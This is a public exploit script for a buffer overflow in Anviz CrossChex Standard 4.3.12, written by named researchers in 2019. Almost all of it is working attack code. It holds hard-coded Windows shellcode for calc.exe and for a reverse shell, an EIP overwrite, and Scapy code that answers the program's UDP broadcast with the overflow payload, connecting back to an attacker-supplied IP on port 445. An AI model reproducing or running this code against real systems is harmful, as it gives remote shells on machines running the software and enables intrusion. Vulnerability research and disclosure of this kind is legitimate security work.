# Exploit Title: Anviz CrossChex 4.3.12 - Local Buffer Overflow
# Date: 2019-11-30
# Exploit Author: Luis Catarino & Pedro Rodrigues
# Vendor Homepage: https://www.anviz.com/
# Software Link: https://www.anviz.com/download.html
# Version: Crosschex Standard x86 <= V4.3.12
# Tested on: 4.3.8.0, 4.3.12
# CVE : N/A
# More info: https://www.0x90.zone/multiple/reverse/2019/11/28/Anviz-pwn.html

import socket
import time
import sys
import binascii

# Scapy for the broadcast packet with custom sport
from scapy.all import Raw,IP,Dot1Q,UDP,Ether
import scapy.all

# shellcode working calc.exe
calculator_payload = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
calculator_payload += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
calculator_payload += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
calculator_payload += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
calculator_payload += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
calculator_payload += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
calculator_payload += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
calculator_payload += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
calculator_payload += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
calculator_payload += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
calculator_payload += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
calculator_payload += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
calculator_payload += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
calculator_payload += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
calculator_payload += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# shellcode windows x86 reverse_shell
shell_payload_1 = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shell_payload_1 += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shell_payload_1 += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shell_payload_1 += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shell_payload_1 += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shell_payload_1 += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shell_payload_1 += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shell_payload_1 += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shell_payload_1 += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shell_payload_1 += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shell_payload_1 += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shell_payload_1 += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell_payload_1 += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
shell_payload_1 += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
shell_payload_1 += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68"

# shellcode windows x86 reverse_shell (part_2)
shell_payload_2 = b"\x68\x02\x00\x01\xbd\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
shell_payload_2 += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
shell_payload_2 += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
shell_payload_2 += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
shell_payload_2 += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
shell_payload_2 += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
shell_payload_2 += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shell_payload_2 += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
shell_payload_2 += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell_payload_2 += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

def ipToShellcode(ip):
  a = ip.split('.')
  b = hex(int(a[0])) + hex(int(a[1])) + hex(int(a[2])) + hex(int(a[3]))
  b = b.replace("0x","")
  return binascii.unhexlify(b)

# sport has to be 5060
def sendFuzzingUDPBroadcast(ip="255.255.255.255", sport=5050, dport=5060):
    request = b"A"*77 # Original payload substitute
    request += b"B"*184
    request += b"\x07\x18\x42\x00" # EIP - 00421807 crosscheck_standard.exe
    request += b"A"*4
    # 269 bytes

    if len(sys.argv) > 2:
      request = request + shell_payload_1 + ipToShellcode(sys.argv[2]) + shell_payload_2
    else:
      request = request + calculator_payload

    scapy.all.sendp( Ether(src='00:00:00:00:00:00', dst="ff:ff:ff:ff:ff:ff")/IP(src=ip,dst='255.255.255.255')/UDP(sport=sport,dport=dport)/Raw(load=request),  iface=sys.argv[1] )

def setFuzzUDPServer(ip='', port=5050, timeout=150):
    try :
    	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
    	print('[!] Failed to create server socket')

    try:
    	s.bind(('', port))
    except:
    	print('[*] Server socket bind failed')
    	sys.exit()

    print('[*] Waiting for crosschex')
    s.settimeout(timeout)
    timeout = time.time() + timeout
    responses = []

    while True:
        if time.time() > timeout:
            break
        try:
            response = s.recvfrom(1024)
            print(response)
            responses.append(response)
            sendFuzzingUDPBroadcast(ip=ip)
            response = s.recvfrom(1024)            
        except socket.timeout:
            print("[!] Error with UDP server")

    s.close()
    return responses

nargs = len(sys.argv)

if nargs < 2:
  print("[*] Usage: python3 %s <network_interface> [<ip>]\n\tif you don't pass the ip of the LHOST it will drop a calculator, if you set the ip it will send a reverse shell to port 445")
  sys.exit(0)

setFuzzUDPServer()